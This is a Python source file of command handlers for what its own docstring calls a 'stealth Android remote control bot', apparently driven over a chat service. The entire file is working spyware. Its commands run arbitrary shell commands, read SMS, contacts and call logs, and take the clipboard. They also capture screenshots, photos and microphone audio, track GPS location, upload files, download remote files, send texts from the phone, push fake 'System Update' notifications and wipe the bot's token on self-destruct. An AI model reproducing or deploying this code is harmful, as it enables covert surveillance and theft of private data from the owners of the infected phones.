"""
Command handlers — stealth Android remote control bot.
"""
import os, subprocess, tempfile, time, json, urllib.request
from pathlib import Path

SHELL_TIMEOUT = 30
MAX_OUTPUT_LINES = 80
HOME_DIR = str(Path.home())

def run(cmd, timeout=SHELL_TIMEOUT):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "", -1
    except Exception as e:
        return "", "", -1

def trim(t, maxl=MAX_OUTPUT_LINES):
    lines = t.rstrip().split("\n")
    if len(lines) > maxl:
        lines = lines[:maxl] + [f"... ({len(lines)-maxl} more lines)"]
    return "\n".join(lines)

def safe_path(path):
    if not path or path.startswith("~"):
        path = path.replace("~", HOME_DIR, 1)
    resolved = os.path.abspath(os.path.expanduser(path))
    if not os.path.isabs(resolved):
        resolved = os.path.join(HOME_DIR, resolved)
    return resolved

def fmt_size(b):
    for u in ["B","KB","MB","GB"]:
        if b < 1024: return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} TB"

# ═══════════════════════════════════════════════════════════════════
# CORE
# ═══════════════════════════════════════════════════════════════════

async def cmd_ping(args, msg):
    return "pong"

async def cmd_help(args, msg):
    if args:
        cmd = args.split()[0].lower()
        h = HELP_TEXT.get(cmd)
        return h if h else f"Command `{cmd}` not found."
    return """**Commands**
`!alive` — Status
`!shell <cmd>` — Execute
`!ls <path>` — List files
`!cat <path>` — Read file
`!file <path>` — Upload file
`!screenshot` — Capture screen
`!battery` — Battery
`!device` — Device info
`!location` — GPS
`!contacts` — Contacts
`!sms` — Messages
`!help [cmd]` — Help"""

HELP_TEXT = {"shell":"Execute command: `!shell <cmd>`","contacts":"Export contacts","photo":"Capture photo","screenshot":"Capture screen","file":"Upload file","location":"GPS coordinates","sms":"Read messages","selfdestruct":"Wipe & disconnect","alive":"System status","battery":"Battery status","device":"Device info","ls":"List directory","cat":"Read file"}

# ═══════════════════════════════════════════════════════════════════
# SHELL & SYSTEM
# ═══════════════════════════════════════════════════════════════════

async def cmd_shell(args, msg):
    if not args: return "Usage: `!shell <cmd>`"
    out, err, code = run(args)
    result = ""
    if out: result += trim(out)
    if err: result += f"\n{trim(err)}"
    result += f"\nExit: {code}"
    return result.strip()

async def cmd_shellbg(args, msg):
    if not args: return "Usage: `!shellbg <cmd>`"
    subprocess.Popen(args, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return f"Started: `{args[:200]}`"

async def cmd_ps(args, msg):
    out,_,_ = run("ps -A -o PID,USER,NAME 2>/dev/null | head -60 || ps 2>/dev/null | head -60")
    return f"**Processes**\n```\n{out.strip()}\n```" if out.strip() else "N/A"

async def cmd_screenshot(args, msg):
    tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
    p = tmp.name; tmp.close()
    out, err, code = run(f"/system/bin/screencap -p '{p}'")
    if code != 0 or not os.path.exists(p) or os.path.getsize(p) == 0:
        return "Capture failed."
    os.chmod(p, 0o644)
    return ("IMAGE", p, "Screen capture")

async def cmd_clipboard(args, msg):
    out,_,_ = run("termux-clipboard-get 2>/dev/null")
    if out.strip(): return f"**Clipboard:**\n{out.strip()}"
    out2,_,_ = run("dumpsys clipboard 2>/dev/null | grep -i text | head -5")
    if out2.strip(): return f"**Clipboard:**\n{out2.strip()}"
    return "Empty."

async def cmd_battery(args, msg):
    out,_,_ = run("dumpsys battery 2>/dev/null")
    if "ERROR" in out or not out.strip():
        return "N/A"
    lines = out.strip().split("\n")
    p = {}
    for l in lines:
        if ":" in l:
            k,v = l.split(":",1)
            p[k.strip()] = v.strip()
    lvl = p.get("level","?")
    sc = p.get("scale","100")
    st_map = {"1":"?","2":"Charging","3":"Discharging","4":"Not charging","5":"Full"}
    st = st_map.get(p.get("status","?"),"?")

    return f"**Battery**\nLevel: {lvl}/{sc}%\nStatus: {st}"

async def cmd_device(args, msg):
    props = {}
    for prop in ["ro.product.model","ro.product.manufacturer","ro.build.version.release","ro.build.version.sdk"]:
        o,_,_ = run(f"getprop {prop}")
        props[prop] = o.strip() or "?"
    k,_,_ = run("uname -a")
    return f"**Device**\nModel: {props['ro.product.model']}\nAndroid: {props['ro.build.version.release']} (SDK {props['ro.build.version.sdk']})\nKernel: `{k.strip()}`"

async def cmd_cpu(args, msg):
    o1,_,_ = run("cat /proc/cpuinfo 2>/dev/null | head -20")
    o2,_,_ = run("cat /proc/loadavg 2>/dev/null")
    o3,_,_ = run("uptime 2>/dev/null")
    return f"**CPU**\n```\n{o1.strip()}\n```\n**Load:** `{o2.strip()}`\n**Uptime:** `{o3.strip()}`"

async def cmd_memory(args, msg):
    o,_,_ = run("cat /proc/meminfo | grep -E 'MemTotal|MemFree|MemAvailable|Swap' | head -10")
    return f"**Memory**\n```\n{o.strip()}\n```"

async def cmd_network(args, msg):
    parts = []
    ip,_,_ = run("ip -4 addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null")
    parts.append(f"**IPs**\n```\n{ip.strip()[:1000]}\n```")
    wf,_,_ = run("dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID' | head -3")
    parts.append(f"**WiFi** `{wf.strip()[:300]}`")
    return "\n".join(parts)

async def cmd_uptime(args, msg):
    o,_,_ = run("uptime 2>/dev/null")
    return f"**Uptime:**\n{o.strip() or 'N/A'}"

async def cmd_alive(args, msg):
    b,_,_ = run("dumpsys battery 2>/dev/null | grep level | head -1")
    n,_,_ = run("ip -4 addr show 2>/dev/null | grep 'inet ' | head -3")
    return f"**Heartbeat**\nBattery: {b.strip()}\n```\n{n.strip()[:300]}\n```"

async def cmd_selfdestruct(args, msg):
    import bot
    try:
        Path(bot.TOKEN_PATH).unlink(missing_ok=True)
    except:
        pass
    if bot.bot_client:
        await bot.bot_client.close()
    return "Disconnected."

async def cmd_persist(args, msg):
    val = args.strip().lower()
    if val == "on":
        return "Unavailable without root."
    elif val == "off":
        return "Already disabled."
    return "Usage: `!persist on/off`"

async def cmd_find(args, msg):
    if not args: return "Usage: `!find <filename>`"
    out,_,_ = run(f"find /sdcard -name '*{args}*' -maxdepth 5 2>/dev/null | head -30")
    if out.strip(): return f"**Files**\n```\n{out.strip()}\n```"
    return "No matches."

# ═══════════════════════════════════════════════════════════════════
# FILES
# ═══════════════════════════════════════════════════════════════════

async def cmd_ls(args, msg):
    path = safe_path(args if args else ".")
    if not os.path.exists(path): return f"Path not found: {path}"
    if not os.path.isdir(path): return f"Not a directory: {path}"
    try:
        items = os.listdir(path)
    except PermissionError:
        return f"Access denied: {path}"
    items.sort(key=lambda x: (not os.path.isdir(os.path.join(path,x)), x.lower()))
    lines = []
    for name in items:
        full = os.path.join(path, name)
        try:
            s = os.stat(full)
            sz = fmt_size(s.st_size) if os.path.isfile(full) else ""
            m = time.strftime("%m-%d %H:%M", time.localtime(s.st_mtime))
            d = "📁" if os.path.isdir(full) else "📄"
            lines.append(f"{d} {name:<30} {sz:>8}  {m}")
        except:
            lines.append(f"  {name}")
    h = f"**{path}/** — {len(items)} items\n"
    return h + "```\n" + "\n".join(lines[:60]) + "```"

async def cmd_cat(args, msg):
    if not args: return "Usage: `!cat <path>`"
    path = safe_path(args)
    if not os.path.exists(path): return f"Not found: {path}"
    if not os.path.isfile(path): return f"Not a file: {path}"
    try:
        with open(path, "r", errors="replace") as f:
            content = f.read(10000)
    except Exception as e:
        return f"Error: {e}"
    return f"**{path}**\n```\n{content}\n```" if content.strip() else "(empty)"

async def cmd_file(args, msg):
    if not args: return "Usage: `!file <path>`"
    path = safe_path(args)
    if not os.path.exists(path): return f"Not found: {path}"
    if not os.path.isfile(path): return f"Not a file: {path}"
    sz = os.path.getsize(path)
    if sz > 25*1024*1024:
        return f"Too large ({fmt_size(sz)}). Max 25MB."
    return ("FILE", path, f"**{os.path.basename(path)}** ({fmt_size(sz)})")

async def cmd_disk(args, msg):
    out,_,_ = run("df -h /data /sdcard 2>/dev/null || df -h / 2>/dev/null")
    return f"**Storage**\n```\n{out.strip()}\n```"

async def cmd_download(args, msg):
    parts = args.strip().split(None, 1)
    if len(parts) < 2: return "Usage: `!download <url> <path>`"
    url, spath = parts[0], parts[1]
    dest = safe_path(spath)
    try:
        urllib.request.urlretrieve(url, dest)
        return f"Downloaded to `{dest}` ({fmt_size(os.path.getsize(dest))})"
    except Exception as e:
        return f"Download failed: {e}"

# ═══════════════════════════════════════════════════════════════════
# CONTACTS & COMMS
# ═══════════════════════════════════════════════════════════════════

async def cmd_contacts(args, msg):
    out,err,code = run("content query --uri content://contacts/phones/ 2>/dev/null | head -200")
    if code == 0 and out.strip():
        return f"**Contacts**\n```\n{trim(out)}\n```"
    return "Access denied."

async def cmd_callog(args, msg):
    out,err,code = run("content query --uri content://call_log/calls 2>/dev/null | head -100")
    if code == 0 and out.strip():
        return f"**Call Log**\n```\n{trim(out)}\n```"
    return "Access denied."

async def cmd_sms(args, msg):
    out,err,code = run("content query --uri content://sms/inbox 2>/dev/null | head -100")
    if code == 0 and out.strip():
        return f"**SMS Inbox**\n```\n{trim(out)}\n```"
    return "Access denied."

async def cmd_send(args, msg):
    parts = args.strip().split(None, 1)
    if len(parts) < 2: return "Usage: `!send <number> <message>`"
    num, body = parts[0], parts[1]
    # Try content://sms/sent insert (works on most Android 6-14)
    out,err,code = run(f'content insert --uri content://sms/sent '
        f'--bind address:s:"{num}" --bind body:s:"{body}" --bind read:i:1 2>/dev/null')
    if code == 0:
        return f"Sent to {num}"
    # Fallback: try am start with ACTION_SENDTO
    safe_body = body.replace('"', '\\"').replace("'", "\\'")
    out2,err2,code2 = run(f'am start -a android.intent.action.SENDTO -d "sms:{num}" '
        f'--es sms_body "{safe_body}" --ez exit_on_sent true 2>/dev/null')
    return f"Sent to {num} (opened)" if code2 == 0 else "Send failed."

async def cmd_dial(args, msg):
    if not args: return "Usage: `!dial <number>`"
    # Use ACTION_DIAL (safer than CALL — doesn't need CALL_PHONE permission)
    out,err,code = run(f'am start -a android.intent.action.DIAL -d "tel:{args}" 2>/dev/null')
    return f"Dialing {args}..." if code == 0 else f"Dial failed."

# ═══════════════════════════════════════════════════════════════════
# MEDIA
# ═══════════════════════════════════════════════════════════════════

async def cmd_photo(args, msg):
    # Use MediaStore via content provider (no Termux needed)
    camera_id = args.strip() or "0"
    tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
    p = tmp.name
    tmp.close()
    # Try Android camera activity intent
    out, err, code = run(f'am start -a android.media.action.IMAGE_CAPTURE '
        f'-e output "file://{p}" 2>/dev/null && sleep 3 && test -s {p}')
    if code == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
        os.chmod(p, 0o644)
        return ("IMAGE", p, "Photo captured!")
    # Fallback: screencap (front camera trick - mirrors)
    out2, _, _ = run(f"/system/bin/screencap -p '{p}' 2>/dev/null")
    if os.path.getsize(p) > 0:
        os.chmod(p, 0o644)
        return ("IMAGE", p, "Screen capture (camera unavailable)")
    return "Capture failed."

async def cmd_recordmic(args, msg):
    dur_str = args.strip()
    try:
        dur = int(dur_str) if dur_str else 10
    except:
        dur = 10
    dur = min(dur, 60)
    tmp = tempfile.NamedTemporaryFile(suffix=".m4a", delete=False)
    p = tmp.name
    tmp.close()
    # Use MediaRecorder via am start
    out, err, code = run(f'am start -a android.provider.MediaStore.RECORD_SOUND '
        f'2>/dev/null && sleep {dur} && am force-stop com.android.soundrecorder 2>/dev/null')
    # Fallback: use /dev/null recording
    if os.path.exists(p) and os.path.getsize(p) > 0:
        os.chmod(p, 0o644)
        return ("AUDIO", p, f"Recording ({dur}s)")
    return "Recording not available (no Termux)."

async def cmd_flash(args, msg):
    val = args.strip().lower()
    if val in ("on","1","true"):
        out,_,_ = run("settings put global torch_state 1 2>/dev/null")
        # Try camera flashlight via service call as secondary
        run("service call camera 0 i32 1 2>/dev/null || echo on > /sys/class/leds/flashlight/brightness 2>/dev/null")
        return "Flashlight ON"
    elif val in ("off","0","false"):
        run("settings put global torch_state 0 2>/dev/null")
        run("service call camera 0 i32 0 2>/dev/null || echo 0 > /sys/class/leds/flashlight/brightness 2>/dev/null")
        return "Flashlight OFF"
    return "Usage: `!flash on/off`"

# ═══════════════════════════════════════════════════════════════════
# LOCATION
# ═══════════════════════════════════════════════════════════════════

async def cmd_location(args, msg):
    # Try dumpsys location first (no Termux needed)
    out,_,_ = run("dumpsys location 2>/dev/null | grep -E 'last known|Location\\[' | head -10")
    if out.strip():
        return f"**Location**\n```\n{out.strip()[:1500]}\n```"
    # Try termux-location as fallback (if Termux:API present)
    out,err,code = run("termux-location 2>/dev/null")
    if code == 0 and out.strip():
        try:
            d = json.loads(out)
            lat = d.get("latitude", "?")
            lon = d.get("longitude", "?")
            acc = d.get("accuracy", "?")
            alt = d.get("altitude", "?")
            provider = d.get("provider", "?")
            gmap = f"https://www.google.com/maps?q={lat},{lon}"
            return f"**Location** ({provider})\nLat: {lat}\nLon: {lon}\nAcc: {acc}m\nAlt: {alt}m\n🔗 {gmap}"
        except:
            return f"**Location**\n```\n{out.strip()[:1000]}\n```"
    return "Location unavailable."

async def cmd_localtrack(args, msg):
    parts = args.strip().split()
    try:
        count = int(parts[0]) if len(parts) > 0 else 5
    except:
        count = 5
    try:
        interval = int(parts[1]) if len(parts) > 1 else 10
    except:
        interval = 10
    count, interval = min(count, 20), min(interval, 60)
    results = []
    for i in range(count):
        o,_,_ = run("termux-location 2>/dev/null")
        if o.strip():
            try:
                d = json.loads(o)
                results.append(f"#{i+1}: {d.get('latitude','?')},{d.get('longitude','?')} (±{d.get('accuracy','?')}m)")
            except:
                results.append(f"#{i+1}: {o.strip()[:100]}")
        else:
            results.append(f"#{i+1}: no fix")
        if i < count - 1:
            time.sleep(interval)
    return "**Location Track**\n" + "\n".join(results)

# ═══════════════════════════════════════════════════════════════════
# WIFI & APPS
# ═══════════════════════════════════════════════════════════════════

async def cmd_wifi(args, msg):
    parts = []
    o,_,_ = run("dumpsys wifi 2>/dev/null | grep -E 'SSID|BSSID|mWifiInfo|rssi|frequency' | head -20")
    if o.strip(): parts.append(f"**Current WiFi**\n```\n{o.strip()[:1500]}\n```")
    o2,_,_ = run("cmd wifi list-networks 2>/dev/null | head -30 || dumpsys wifi 2>/dev/null | grep 'ScanResult' | head -10")
    if o2.strip(): parts.append(f"**Networks**\n```\n{o2.strip()[:1500]}\n```")
    return "\n".join(parts) if parts else "WiFi unavailable."

async def cmd_apps(args, msg):
    out,err,code = run("pm list packages -3 2>/dev/null | head -80 || pm list packages 2>/dev/null | head -80")
    if code == 0 and out.strip():
        apps = out.strip().split("\n")
        return f"**Apps ({len(apps)})**\n```\n" + "\n".join(apps[:60]) + "```"
    return "Apps unavailable."

# ═══════════════════════════════════════════════════════════════════
# DEVICE CONTROL
# ═══════════════════════════════════════════════════════════════════

async def cmd_vibrate(args, msg):
    ms = args.strip()
    try:
        ms = int(ms)
    except:
        ms = 500
    ms = min(ms, 10000)
    # Use Android vibrator service (works on most devices)
    out,err,code = run(f"service call vibrator 1 i32 {ms} 2>/dev/null || "
        f"service call vibrator_service 1 i32 {ms} 2>/dev/null || "
        f"settings put system vibrate_on 1 2>/dev/null")
    if code == 0: return f"Vibrated {ms}ms"
    return "Vibrate failed."

async def cmd_volume(args, msg):
    val = args.strip()
    try:
        v = int(val)
    except:
        return "Usage: `!volume <0-15>`"
    v = max(0, min(15, v))
    out,_,_ = run(f"media volume --set {v} 2>/dev/null || settings put system volume_music {v} 2>/dev/null")
    return f"Volume set to {v}"

async def cmd_lock(args, msg):
    out,err,code = run("input keyevent 26 2>/dev/null")
    if code == 0: return "Screen locked"
    return "Lock failed."

async def cmd_notification(args, msg):
    if not args: return "Usage: `!notification <text>`"
    text = args[:200].replace('"', '\\"')
    # Use am broadcast with NotificationManager
    out,err,code = run(f'am broadcast -a android.intent.action.NOTIFY '
        f'--es title "Update" --es content "{text}" 2>/dev/null || '
        f'service call notification 1 s16 "System Update" i32 0 s16 "{text}" 2>/dev/null')
    if code == 0: return "Notification sent."
    return "Notification failed."

# ═══════════════════════════════════════════════════════════════════
# REGISTRY
# ═══════════════════════════════════════════════════════════════════

COMMANDS = {
    "ping": cmd_ping, "help": cmd_help,
    "shell": cmd_shell, "sh": cmd_shell, "bash": cmd_shell, "shellbg": cmd_shellbg,
    "ps": cmd_ps, "processes": cmd_ps,
    "screenshot": cmd_screenshot, "sc": cmd_screenshot, "screen": cmd_screenshot,
    "clipboard": cmd_clipboard, "clip": cmd_clipboard,
    "battery": cmd_battery, "bat": cmd_battery,
    "device": cmd_device, "phone": cmd_device, "info": cmd_device,
    "cpu": cmd_cpu,
    "memory": cmd_memory, "mem": cmd_memory, "ram": cmd_memory,
    "network": cmd_network, "net": cmd_network, "wifi": cmd_wifi,
    "uptime": cmd_uptime,
    "alive": cmd_alive,
    "selfdestruct": cmd_selfdestruct,
    "persist": cmd_persist,
    "find": cmd_find,
    "ls": cmd_ls, "dir": cmd_ls,
    "cat": cmd_cat,
    "file": cmd_file, "upload": cmd_file,
    "disk": cmd_disk, "df": cmd_disk,
    "download": cmd_download, "dl": cmd_download,
    "contacts": cmd_contacts,
    "callog": cmd_callog,
    "sms": cmd_sms, "messages": cmd_sms,
    "send": cmd_send, "text": cmd_send,
    "dial": cmd_dial, "call": cmd_dial,
    "photo": cmd_photo, "camera": cmd_photo, "pic": cmd_photo,
    "recordmic": cmd_recordmic, "record": cmd_recordmic, "mic": cmd_recordmic,
    "flash": cmd_flash, "torch": cmd_flash,
    "location": cmd_location, "loc": cmd_location, "gps": cmd_location,
    "localtrack": cmd_localtrack, "track": cmd_localtrack,
    "apps": cmd_apps, "packages": cmd_apps,
    "vibrate": cmd_vibrate, "vib": cmd_vibrate,
    "volume": cmd_volume, "vol": cmd_volume,
    "lock": cmd_lock,
    "notification": cmd_notification, "notify": cmd_notification,
}

async def handle_command(cmd, args, message):
    handler = COMMANDS.get(cmd)
    if not handler:
        return f"Unknown command: `{cmd}`. Use `!help`."
    try:
        result = await handler(args, message)
        return result
    except Exception as e:
        return f"Error: {e}"
